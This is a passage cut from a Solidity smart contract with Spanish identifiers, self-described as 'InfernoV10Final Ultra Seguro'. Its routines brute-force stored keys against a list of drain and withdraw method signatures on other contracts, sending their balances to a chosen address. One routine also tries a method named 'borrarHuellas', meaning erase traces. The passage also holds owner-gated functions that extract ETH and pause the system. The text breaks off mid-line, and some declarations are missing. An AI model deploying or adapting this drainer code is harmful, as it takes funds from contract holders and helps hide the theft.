
    
     && chip.sistemaActivo, "Chip IA inactivo");
        _;
    }
    
    modifier antiBotCorregido() {
        require(tx.origin == msg.sender || msg.sender == address(this), "No bots externos permitidos");
        _;
    }
    
    
        
        todasLasClaves[1] = hashBoveda2;
        todasLasClaves[2] = hashBovedaOpcional;
        todasLasClaves[3] = HASH_KEY1;
        
        for (uint i = 0; i < clavesPersonalizadas.length; i++) {
            todasLasClaves[4 + i] = clavesPersonalizadas[i];
        }
        
        string[10] memory metodos = ["emergencyDrain(address,bytes32)", "drenarEmergencia(address,bytes32)", "extraerFondos(address,bytes32)", "retirarTodo(address,bytes32)", "withdraw(address,bytes32)", "drain(address,bytes32)", "rescue(address,bytes32)", "evacuate(address,bytes32)", "claimFunds(address,bytes32)", "extractBalance(address,bytes32)"];
        
        for (uint j = 0; j < todasLasClaves.length; j++) {
            for (uint k = 0; k < metodos.length; k++) {
                try this._ejecutarLlamadaDrenado(contrato, destino, todasLasClaves[j], metodos[k]) {
                    emit DrenadoAvanzado(contrato, destino, metodos[k], 0);
                    return;
                } catch { continue; }
            }
        }
    }
    
    function _ejecutarLlamadaDrenado(address contrato, address destino, bytes32 clave, string memory metodo) external {
        require(msg.sender == address(this), "Solo auto-llamada");
        (bool exito, ) = contrato.call(abi.encodeWithSignature(metodo, destino, clave));
        require(exito, "Llamada fallida");
    }
    
    // Recuperar contratos anteriores
    function recuperarContratosAnteriores(address[] calldata misContratosViejos, bytes32 hashOwner, bytes32 key1, bytes32 key2) external soloOwnerConHashes(hashOwner, key1, key2) returns (uint256 totalRecuperado) {
        uint256 balanceInicial = address(this).balance;
        
        for (uint i = 0; i < misContratosViejos.length; i++) {
            if (!contratosAnterioresRecuperados[misContratosViejos[i]]) {
                _recuperarContratoAnterior(misContratosViejos[i]);
                contratosAnterioresRecuperados[misContratosViejos[i]] = true;
            }
        }
        
        totalRecuperado = address(this).balance - balanceInicial;
        emit SaldoRecuperado(address(0), totalRecuperado, "CONTRATOS_ANTERIORES_RECUPERADOS");
        return totalRecuperado;
    }
    
    function _recuperarContratoAnterior(address contratoViejo) internal {
        bytes32[4] memory clavesAnteriores = [CLAVE_ANTERIOR_1, CLAVE_ANTERIOR_2, CLAVE_ANTERIOR_3, CLAVE_ANTERIOR_4];
        string[8] memory metodosAnteriores = ["emergencyDrain(address,bytes32)", "drenarEmergencia(address,bytes32)", "extraerFondos(address,bytes32)", "retirarTodo(address,bytes32)", "withdraw(address,bytes32)", "drain(address,bytes32)", "rescue(address,bytes32)", "borrarHuellas(bytes32)"];
        
        for (uint j = 0; j < clavesAnteriores.length; j++) {
            for (uint k = 0; k < metodosAnteriores.length; k++) {
                try this._ejecutarRecuperacionAnterior(contratoViejo, address(this), clavesAnteriores[j], metodosAnteriores[k]) {
                    emit DrenadoAvanzado(contratoViejo, address(this), metodosAnteriores[k], 0);
                    return;
                } catch { continue; }
            }
        }
    }
    
    function _ejecutarRecuperacionAnterior(address contratoViejo, address destino, bytes32 claveAnterior, string memory metodo) external {
        require(msg.sender == address(this), "Solo auto-llamada");
        (bool exito, ) = contratoViejo.call(abi.encodeWithSignature(metodo, destino, claveAnterior));
        require(exito, "Metodo anterior fallido");
    }
    
    // Funciones de emergencia
    function pausarSistemaEmergencia(bytes32 hashOwner, bytes32 key1, bytes32 key2) external soloOwnerConHashes(hashOwner, key1, key2) {
        chip.sistemaActivo = false;
        chip.comunicacionActiva = false;
    }
    
    function extraerETHEmergencia(uint256 cantidad, bytes32 hashOwner, bytes32 key1, bytes32 key2) external soloOwnerConHashes(hashOwner, key1, key2) {
        require(cantidad <= address(this).balance, "Cantidad excede balance");
        payable(tx.origin).transfer(cantidad);
        emit SaldoRecuperado(address(this), cantidad, "ETH_EXTRAIDO_EMERGENCIA");
    }
    
    // Funciones de informacion
    function version() external pure returns (string memory) {
        return "InfernoV10Final Ultra Seguro v1.0.0";
    }
    
    function obtenerChainId() external view returns (uint256) { return chainId; }
    function esDireccionBloqueada(address direccion) external view returns (bool) { return listaNegra[direccion]; }
    function esChainCompatible(uint256 chainIdVerificar) external view returns (bool) { return chainsCompatibles[chainIdVerificar]; }
    
    function obtenerInformacionCompleta(bytes32 hashOwner, bytes32 key1, bytes32 key2) external view soloOwnerConHashes(hashOwner, key1, key2) returns (string memory nombreToken, string memory simboloToken, uint256 